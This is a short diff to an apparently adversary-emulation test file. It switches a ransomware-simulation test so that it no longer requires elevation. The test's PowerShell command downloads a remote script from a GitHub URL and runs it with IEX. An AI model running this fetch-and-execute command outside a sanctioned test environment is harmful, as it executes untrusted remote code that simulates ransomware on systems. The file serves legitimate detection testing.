@@ -354,7 +354,7 @@ atomic_tests:
       default: https://raw.githubusercontent.com/Moerov/FireSOC/refs/heads/main/utils/ransomtest.ps1
   executor:
     name: powershell
-    elevation_required: true
+    elevation_required: false
     command: |
       IEX (New-Object Net.WebClient).DownloadString("#{ransom_sim_script_url}")
     cleanup_command: |
